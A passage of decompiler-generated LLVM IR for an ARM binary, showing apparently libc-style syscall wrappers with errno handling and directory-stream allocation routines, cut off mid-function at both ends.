  br i1 %tmp, label %dec_label_pc_10d10, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10ce4
  %v0_10d00 = call i32 @function_11200()
  %v0_10d04 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d04 = sub i32 0, %v0_10d04
  %v2_10d08 = inttoptr i32 %v0_10d00 to i32*
  store i32 %v1_10d04, i32* %v2_10d08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10d10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10ce4, %dec_label_pc_10d00
  %v1_10d14 = phi i32 [ %v0_10cf0, %dec_label_pc_10ce4 ], [ -1, %dec_label_pc_10d00 ]
  %v2_10d10 = phi i32 [ %v3_10ce4, %dec_label_pc_10ce4 ], [ %v2_10d10.pre, %dec_label_pc_10d00 ]
  store i32 %v2_10d10, i32* @r7, align 4
  ret i32 %v1_10d14

; uselistorder directives
  uselistorder i32 %v0_10cf0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d10, { 1, 0 }
}

define i32 @function_10d18(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d18:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d18 = load i32, i32* @r7, align 4
  store i32 %v3_10d18, i32* %stack_var_-8, align 4
  %v0_10d24 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10d24, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10d24, -4095
  br i1 %tmp, label %dec_label_pc_10d44, label %dec_label_pc_10d34

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d18
  %v0_10d34 = call i32 @function_11200()
  %v0_10d38 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d38 = sub i32 0, %v0_10d38
  %v2_10d3c = inttoptr i32 %v0_10d34 to i32*
  store i32 %v1_10d38, i32* %v2_10d3c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10d44.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d44

dec_label_pc_10d44:                               ; preds = %dec_label_pc_10d18, %dec_label_pc_10d34
  %v1_10d48 = phi i32 [ %v0_10d24, %dec_label_pc_10d18 ], [ -1, %dec_label_pc_10d34 ]
  %v2_10d44 = phi i32 [ %v3_10d18, %dec_label_pc_10d18 ], [ %v2_10d44.pre, %dec_label_pc_10d34 ]
  store i32 %v2_10d44, i32* @r7, align 4
  ret i32 %v1_10d48

; uselistorder directives
  uselistorder i32 %v0_10d24, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d44, { 1, 0 }
}

define i32 @function_10d4c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10d4c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10d4c = load i32, i32* @r3, align 4
  store i32 %v9_10d4c, i32* %stack_var_-4, align 4
  %v2_10d58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10d58, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10d8c, label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d4c
  %v0_10d7c = call i32 @function_11200()
  %v0_10d80 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d80 = sub i32 0, %v0_10d80
  store i32 %v1_10d80, i32* @r3, align 4
  %v2_10d84 = inttoptr i32 %v0_10d7c to i32*
  store i32 %v1_10d80, i32* %v2_10d84, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10d8c

dec_label_pc_10d8c:                               ; preds = %dec_label_pc_10d4c, %dec_label_pc_10d7c
  %v0_10d8c = phi i32 [ %arg1, %dec_label_pc_10d4c ], [ -1, %dec_label_pc_10d7c ]
  ret i32 %v0_10d8c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d8c, { 1, 0 }
}

define i32 @function_10da0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10da0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10da0 = load i32, i32* @r7, align 4
  store i32 %v3_10da0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10dcc, label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10da0
  %v0_10dbc = call i32 @function_11200()
  %v0_10dc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_10dc0 = sub i32 0, %v0_10dc0
  %v2_10dc4 = inttoptr i32 %v0_10dbc to i32*
  store i32 %v1_10dc0, i32* %v2_10dc4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10dd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10da0, %dec_label_pc_10dbc
  %v2_10dd0 = phi i32 [ %v3_10da0, %dec_label_pc_10da0 ], [ %v2_10dd0.pre, %dec_label_pc_10dbc ]
  %v0_10dcc = phi i32 [ %arg1, %dec_label_pc_10da0 ], [ -1, %dec_label_pc_10dbc ]
  store i32 %v2_10dd0, i32* @r7, align 4
  ret i32 %v0_10dcc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10dcc, { 1, 0 }
}

define i32 @function_10dd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10dd8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10dd8 = load i32, i32* @r7, align 4
  store i32 %v3_10dd8, i32* %stack_var_-8, align 4
  %v0_10de4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10de4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10de4, -4095
  br i1 %tmp, label %dec_label_pc_10e04, label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10dd8
  %v0_10df4 = call i32 @function_11200()
  %v0_10df8 = load i32, i32* %r7.global-to-local, align 4
  %v1_10df8 = sub i32 0, %v0_10df8
  store i32 %v1_10df8, i32* @r3, align 4
  %v2_10dfc = inttoptr i32 %v0_10df4 to i32*
  store i32 %v1_10df8, i32* %v2_10dfc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10e04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10df4
  %v1_10e08 = phi i32 [ %v0_10de4, %dec_label_pc_10dd8 ], [ -1, %dec_label_pc_10df4 ]
  %v2_10e04 = phi i32 [ %v3_10dd8, %dec_label_pc_10dd8 ], [ %v2_10e04.pre, %dec_label_pc_10df4 ]
  store i32 %v2_10e04, i32* @r7, align 4
  ret i32 %v1_10e08

; uselistorder directives
  uselistorder i32 %v0_10de4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e04, { 1, 0 }
}

define i32 @function_10e0c(i32* %arg1) local_unnamed_addr {
dec_label_pc_10e0c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10e0c = load i32, i32* @r4, align 4
  store i32 %v3_10e0c, i32* %stack_var_-24, align 4
  %v9_10e0c = load i32, i32* @r6, align 4
  %v12_10e0c = load i32, i32* @r7, align 4
  %v15_10e0c = load i32, i32* @r8, align 4
  %v18_10e0c = load i32, i32* @lr, align 4
  %v2_10e10 = load i32, i32* %arg1, align 4
  store i32 %v2_10e10, i32* %r4.global-to-local, align 4
  %v3_10e18 = icmp eq i32 %v2_10e10, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 124804, i32* @r6, align 4
  br i1 %v3_10e18, label %dec_label_pc_10e2c, label %dec_label_pc_10e40

dec_label_pc_10e2c:                               ; preds = %dec_label_pc_10e0c
  %v0_10e2c = call i32 @function_11200()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_10e34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10e34, i32* %r2.global-to-local, align 4
  %v2_10e38 = inttoptr i32 %v0_10e2c to i32*
  store i32 9, i32* %v2_10e38, align 4
  %v0_10ee0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ee0

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e0c
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_10e44 = add i32 %tmp, 24
  store i32 %v1_10e44, i32* %r4.global-to-local, align 4
  store i32 %v1_10e44, i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_10e58 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10e58)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10e70 = load i32, i32* @r6, align 4
  %v2_10e70 = add i32 %v0_10e70, 16
  %v3_10e70 = inttoptr i32 %v2_10e70 to i32*
  %v4_10e70 = load i32, i32* %v3_10e70, align 4
  call void @__pseudo_branch(i32 %v4_10e70)
  %v0_10e7c = load i32, i32* @r7, align 4
  %v1_10e7c = inttoptr i32 %v0_10e7c to i32*
  %v2_10e7c = load i32, i32* %v1_10e7c, align 4
  store i32 %v2_10e7c, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_10e8c = load i32, i32* @r8, align 4
  store i32 %v0_10e8c, i32* %v1_10e7c, align 4
  %v0_10e90 = load i32, i32* @r6, align 4
  %v1_10e90 = load i32, i32* %r3.global-to-local, align 4
  %v2_10e90 = add i32 %v1_10e90, %v0_10e90
  %v3_10e90 = inttoptr i32 %v2_10e90 to i32*
  %v4_10e90 = load i32, i32* %v3_10e90, align 4
  store i32 %v4_10e90, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_10e9c.336 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10e90)
  %v0_10e9c = load i32, i32* @r7, align 4
  %v1_10e9c = add i32 %v0_10e9c, 12
  %v2_10e9c = inttoptr i32 %v1_10e9c to i32*
  %v3_10e9c = load i32, i32* %v2_10e9c, align 4
  store i32 %v3_10e9c, i32* @r0, align 4
  %v0_10ea0 = call i32 @function_12898()
  %v0_10ea4 = load i32, i32* @r7, align 4
  store i32 %v0_10ea4, i32* @r0, align 4
  %v0_10ea8 = call i32 @function_12898()
  %v0_10eb0 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_10eb0, -4095
  br i1 %tmp11, label %dec_label_pc_10edc, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10e40
  %v0_10ecc = call i32 @function_11200()
  %v0_10ed0 = load i32, i32* @r4, align 4
  %v1_10ed0 = sub i32 0, %v0_10ed0
  store i32 %v1_10ed0, i32* %r3.global-to-local, align 4
  %v2_10ed4 = inttoptr i32 %v0_10ecc to i32*
  store i32 %v1_10ed0, i32* %v2_10ed4, align 4
  %v0_10ed8 = load i32, i32* @r8, align 4
  br label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10e40, %dec_label_pc_10ecc
  %v0_10edc = phi i32 [ %v0_10eb0, %dec_label_pc_10e40 ], [ %v0_10ed8, %dec_label_pc_10ecc ]
  store i32 %v0_10edc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ee0

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10e2c, %dec_label_pc_10edc
  %v0_10ee0 = phi i32 [ %v0_10ee0.pre, %dec_label_pc_10e2c ], [ %v0_10edc, %dec_label_pc_10edc ]
  %v2_10ee8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10ee8, i32* @r4, align 4
  store i32 %v9_10e0c, i32* @r6, align 4
  store i32 %v12_10e0c, i32* @r7, align 4
  store i32 %v15_10e0c, i32* @r8, align 4
  store i32 %v18_10e0c, i32* @lr, align 4
  ret i32 %v0_10ee0

; uselistorder directives
  uselistorder i32 %v0_10eb0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_10ee0, { 1, 0 }
  uselistorder label %dec_label_pc_10edc, { 1, 0 }
}

define i32 @function_10ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ef4:
  %v0_10ef4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10ef4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10ef4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10ef4, %bb
  %v10_10f00 = phi i32 [ %arg1, %dec_label_pc_10ef4 ], [ 0, %bb ]
  ret i32 %v10_10f00

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_10f04(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10f04:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10f04 = load i32, i32* @r5, align 4
  %v9_10f04 = load i32, i32* @r6, align 4
  %v12_10f04 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_10f18 = call i32 @function_1182c()
  %v2_10f20 = icmp eq i32 %v0_10f18, 0
  store i32 124804, i32* @r6, align 4
  br i1 %v2_10f20, label %bb, label %dec_label_pc_10f30

bb:                                               ; preds = %dec_label_pc_10f04
  br label %dec_label_pc_10fbc

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10f04
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10f34 = load i32, i32* @r4, align 4
  %v2_10f34 = icmp ugt i32 %v0_10f34, 511
  %v2_10f38 = add i32 %v0_10f18, 4
  %v3_10f38 = inttoptr i32 %v2_10f38 to i32*
  store i32 0, i32* %v3_10f38, align 4
  %v0_10f3c = load i32, i32* %r3.global-to-local, align 4
  %v2_10f3c = add i32 %v0_10f18, 16
  %v3_10f3c = inttoptr i32 %v2_10f3c to i32*
  store i32 %v0_10f3c, i32* %v3_10f3c, align 4
  %v0_10f40 = load i32, i32* %r3.global-to-local, align 4
  %v2_10f40 = add i32 %v0_10f18, 8
  %v3_10f40 = inttoptr i32 %v2_10f40 to i32*
  store i32 %v0_10f40, i32* %v3_10f40, align 4
  br i1 %v2_10f34, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_10f30
  %v0_10f482 = load i32, i32* @r4, align 4
  %v2_10f483 = add i32 %v0_10f18, 20
  %v3_10f484 = inttoptr i32 %v2_10f483 to i32*
  store i32 %v0_10f482, i32* %v3_10f484, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_10f30
  %v1_10f44 = load i32, i32* %r3.global-to-local, align 4
  %v2_10f44 = add i32 %v1_10f44, 512
  store i32 %v2_10f44, i32* %r3.global-to-local, align 4
  %v0_10f48 = load i32, i32* @r4, align 4
  %v2_10f48 = add i32 %v0_10f18, 20
  %v3_10f48 = inttoptr i32 %v2_10f48 to i32*
  store i32 %v0_10f48, i32* %v3_10f48, align 4
  %v1_10f4c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_10f4c, i32* %v3_10f48, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_10f18, i32* @r5, align 4
  %v0_10f54 = load i32, i32* @r7, align 4
  %v2_10f54 = inttoptr i32 %v0_10f18 to i32*
  store i32 %v0_10f54, i32* %v2_10f54, align 4
  %v0_10f58 = load i32, i32* @r5, align 4
  %v1_10f58 = add i32 %v0_10f58, 20
  %v2_10f58 = inttoptr i32 %v1_10f58 to i32*
  %v3_10f58 = load i32, i32* %v2_10f58, align 4
  store i32 %v3_10f58, i32* %r1.global-to-local, align 4
  %v2_10f60 = call i32 @function_1214c(i32 1, i32 %v3_10f58)
  %v2_10f64 = icmp eq i32 %v2_10f60, 0
  store i32 %v2_10f60, i32* @r4, align 4
  %v1_10f6c = load i32, i32* @r5, align 4
  %v2_10f6c = add i32 %v1_10f6c, 12
  %v3_10f6c = inttoptr i32 %v2_10f6c to i32*
  store i32 %v2_10f60, i32* %v3_10f6c, align 4
  br i1 %v2_10f64, label %dec_label_pc_10f74, label %dec_label_pc_10f84

dec_label_pc_10f74:                               ; preds = %bb17
  %v0_10f74 = load i32, i32* @r5, align 4
  store i32 %v0_10f74, i32* @r0, align 4
  %v0_10f78 = call i32 @function_12898()
  %v0_10f7c = load i32, i32* @r4, align 4
  br label %dec_label_pc_10fbc

dec_label_pc_10f84:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_10fac = load i32, i32* @r5, align 4
  %v1_10fac = add i32 %v0_10fac, 24
  %v1_10fb0 = inttoptr i32 %v1_10fac to i32*
  store i32 0, i32* %v1_10fb0, align 4
  %v3_10fb0 = add i32 %v0_10fac, 28
  %v4_10fb0 = inttoptr i32 %v3_10fb0 to i32*
  %v5_10fb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10fb0, i32* %v4_10fb0, align 4
  %v6_10fb0 = add i32 %v0_10fac, 32
  %v7_10fb0 = inttoptr i32 %v6_10fb0 to i32*
  %v8_10fb0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10fb0, i32* %v7_10fb0, align 4
  %v9_10fb0 = add i32 %v0_10fac, 36
  %v10_10fb0 = inttoptr i32 %v9_10fb0 to i32*
  %v11_10fb0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_10fb0, i32* %v10_10fb0, align 4
  %v12_10fb0 = add i32 %v0_10fac, 40
  store i32 %v12_10fb0, i32* @ip, align 4
  %v2_10fb4 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_10fb8 = inttoptr i32 %v12_10fb0 to i32*
  store i32 %v2_10fb4, i32* %v1_10fb8, align 4
  %v3_10fb8 = add i32 %v0_10fac, 44
  %v4_10fb8 = inttoptr i32 %v3_10fb8 to i32*
  %v5_10fb8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10fb8, i32* %v4_10fb8, align 4
  %v0_10fbc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10fbc

dec_label_pc_10fbc:                               ; preds = %bb, %dec_label_pc_10f74, %dec_label_pc_10f84
  %v0_10fbc = phi i32 [ 0, %bb ], [ %v0_10f7c, %dec_label_pc_10f74 ], [ %v0_10fbc.pre, %dec_label_pc_10f84 ]
  store i32 %v6_10f04, i32* @r5, align 4
  store i32 %v9_10f04, i32* @r6, align 4
  store i32 %v12_10f04, i32* @r7, align 4
  ret i32 %v0_10fbc

; uselistorder directives
  uselistorder i32 %v2_10f60, { 1, 0, 2 }
  uselistorder i32 %v0_10f18, { 6, 5, 4, 0, 1, 3, 2, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 512, { 7, 4, 0, 1, 8, 5, 9, 6, 10, 2, 11, 3, 12 }
  uselistorder label %dec_label_pc_10fbc, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_10fd4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10fd4:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v6_10fd4 = load i32, i32* @r7, align 4
  %v2_10fdc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_11004, label %dec_label_pc_10ff4

dec_label_pc_10ff4:                               ; preds = %dec_label_pc_10fd4
  %v0_10ff4 = call i32 @function_11200()
  %v0_10ff8 = load i32, i32* @r7, align 4
  %v1_10ff8 = sub i32 0, %v0_10ff8
  %v2_10ffc = inttoptr i32 %v0_10ff4 to i32*
  store i32 %v1_10ff8, i32* %v2_10ffc, align 4
  br label %dec_label_pc_11028

dec_label_pc_11004:                               ; preds = %dec_label_pc_10fd4
  %v1_11004 = icmp slt i32 %arg1, 0
  br i1 %v1_11004, label %dec_label_pc_11028, label %dec_label_pc_1100c

dec_label_pc_1100c:                               ; preds = %dec_label_pc_11004
  store i32 %v2_10fdc, i32* @r1, align 4
  %v0_11010 = call i32 @function_13d48()
  %v1_11014 = icmp slt i32 %v0_11010, 0
  br i1 %v1_11014, label %dec_label_pc_1101c, label %dec_label_pc_11030

dec_label_pc_1101c:                               ; preds = %dec_label_pc_1100c
  br label %dec_label_pc_11028

dec_label_pc_11028:                               ; preds = %dec_label_pc_1101c, %dec_label_pc_11004, %dec_label_pc_10ff4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1106c

dec_label_pc_11030:                               ; preds = %dec_label_pc_1100c
  %v0_11038 = load i32, i32* @r7, align 4
  %v3_1103c = call i32 @function_10c78(i32 %v0_11038, i32 2, i32 1)
  %v0_11040 = load i32, i32* @r7, align 4
  %v2_11048 = call i32 @function_10f04(i32 %v0_11040, i32 %tmp)
  store i32 %v2_11048, i32* %r4.global-to-local, align 4
  %v2_1104c = icmp eq i32 %v2_11048, 0
  br i1 %v2_1104c, label %dec_label_pc_11054, label %dec_label_pc_1106c

dec_label_pc_11054:                               ; preds = %dec_label_pc_11030
  %v0_11060 = call i32 @function_11200()
  %v2_11068 = inttoptr i32 %v0_11060 to i32*
  store i32 12, i32* %v2_11068, align 4
  %v0_1106c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_11030, %dec_label_pc_11028, %dec_label_pc_11054
  %v0_1106c = phi i32 [ %v2_11048, %dec_label_pc_11030 ], [ 0, %dec_label_pc_11028 ], [ %v0_1106c.pre, %dec_label_pc_11054 ]
  store i32 %v6_10fd4, i32* @r7, align 4
  ret i32 %v0_1106c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1106c, { 2, 0, 1 }
}

define i32 @function_1107c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1107c:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_1107c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1107c, label %bb, label %dec_label_pc_1107c._crit_edge

dec_label_pc_1107c._crit_edge:                    ; preds = %dec_label_pc_1107c
  br label %bb11

bb:                                               ; preds = %dec_label_pc_1107c
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_1107c._crit_edge, %bb
  %v2_11084 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_11084, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11090 = call i32 @function_13d48()
  store i32 %v0_11090, i32* @r5, align 4
  %v2_11094 = icmp eq i32 %v0_11090, 0
  br i1 %v2_11094, label %dec_label_pc_1109c, label %dec_label_pc_11104

dec_label_pc_1109c:                               ; preds = %bb11
  %v1_110a0 = and i32 %tmp5, 61440
  store i32 %v1_110a0, i32* @r3, align 4
  %v7_110a4 = icmp eq i32 %v1_110a0, 16384
  br i1 %v7_110a4, label %dec_label_pc_110bc, label %dec_label_pc_110ac

dec_label_pc_110ac:                               ; preds = %dec_label_pc_1109c
  %v0_110ac = call i32 @function_11200()
  br label %dec_label_pc_110e8

dec_label_pc_110bc:                               ; preds = %dec_label_pc_1109c
  %v0_110bc = load i32, i32* @r4, align 4
  %v2_110c4 = call i32 @function_10c0c(i32 %v0_110bc, i32 3)
  %v7_110c8 = icmp eq i32 %v2_110c4, -1
  br i1 %v7_110c8, label %dec_label_pc_11104, label %dec_label_pc_110d0

dec_label_pc_110d0:                               ; preds = %dec_label_pc_110bc
  %v1_110d0 = urem i32 %v2_110c4, 4
  %v7_110d4 = icmp eq i32 %v1_110d0, 1
  br i1 %v7_110d4, label %dec_label_pc_110dc, label %dec_label_pc_110f0

dec_label_pc_110dc:                               ; preds = %dec_label_pc_110d0
  %v0_110dc = call i32 @function_11200()
  br label %dec_label_pc_110e8

dec_label_pc_110e8:                               ; preds = %dec_label_pc_110ac, %dec_label_pc_110dc
  %storemerge2 = phi i32 [ %v0_110ac, %dec_label_pc_110ac ], [ %v0_110dc, %dec_label_pc_110dc ]
  %storemerge = phi i32 [ 20, %dec_label_pc_110ac ], [ 22, %dec_label_pc_110dc ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_110e8 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_110e8, align 4
  %v0_11108.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11108

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110d0
  %v0_110f0 = load i32, i32* @r4, align 4
  %v2_110f8 = call i32 @function_10f04(i32 %v0_110f0, i32 %tmp)
  store i32 %v2_110f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11108

dec_label_pc_11104:                               ; preds = %bb11, %dec_label_pc_110bc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %dec_label_pc_110f0, %dec_label_pc_110e8, %dec_label_pc_11104
  %v0_11108 = phi i32 [ %v2_110f8, %dec_label_pc_110f0 ], [ %v0_11108.pre, %dec_label_pc_110e8 ], [ 0, %dec_label_pc_11104 ]
  ret i32 %v0_11108

; uselistorder directives
  uselistorder i32 %v2_110c4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10f04, { 1, 0 }
  uselistorder i32 ()* @function_13d48, { 1, 0 }
  uselistorder label %dec_label_pc_11108, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11104, { 1, 0 }
  uselistorder label %dec_label_pc_110e8, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_11118(i32* %arg1) local_unnamed_addr {
dec_label_pc_11118:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11118 = load i32, i32* @r4, align 4
  %v6_11118 = load i32, i32* @r5, align 4
  %v9_11118 = load i32, i32* @r6, align 4
  %v12_11118 = load i32, i32* @r7, align 4
  %v15_11118 = load i32, i32* @lr, align 4
  store i32 124804, i32* @r6, align 4
  %v1_1112c = add i32 %tmp, 24
  store i32 %v1_1112c, i32* @r4, align 4
  %v4_11130 = load i32, i32* inttoptr (i32 124840 to i32*), align 8
  store i32 %v4_11130, i32* %r1.global-to-local, align 4
  store i32 %v1_1112c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11144 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11144)
  %v0_11158 = load i32, i32* @r6, align 4
  %v2_11158 = add i32 %v0_11158, 16
  %v3_11158 = inttoptr i32 %v2_11158 to i32*
  %v4_11158 = load i32, i32* %v3_11158, align 4
  store i32 %v4_11158, i32* @ip, align 4
  store i32 69988, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11158)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11168

dec_label_pc_11168:                               ; preds = %dec_label_pc_11198, %dec_label_pc_11118
  %v0_11168 = load i32, i32* @r5, align 4
  %v1_11168 = add i32 %v0_11168, 4
  %v2_11168 = inttoptr i32 %v1_11168 to i32*
  %v3_11168 = load i32, i32* %v2_11168, align 4
  store i32 %v3_11168, i32* %r2.global-to-local, align 4
  %v4_11168 = add i32 %v0_11168, 8
  %v5_11168 = inttoptr i32 %v4_11168 to i32*
  %v6_11168 = load i32, i32* %v5_11168, align 4
  %tmp10 = icmp ugt i32 %v6_11168, %v3_11168
  br i1 %tmp10, label %dec_label_pc_11198, label %dec_label_pc_11174

dec_label_pc_11174:                               ; preds = %dec_label_pc_11168
  %v1_11174 = inttoptr i32 %v0_11168 to i32*
  %v2_11174 = load i32, i32* %v1_11174, align 4
  %v1_11178 = add i32 %v0_11168, 12
  %v2_11178 = inttoptr i32 %v1_11178 to i32*
  %v3_11178 = load i32, i32* %v2_11178, align 4
  store i32 %v3_11178, i32* %r1.global-to-local, align 4
  %v1_1117c = add i32 %v0_11168, 20
  %v2_1117c = inttoptr i32 %v1_1117c to i32*
  %v3_1117c = load i32, i32* %v2_1117c, align 4
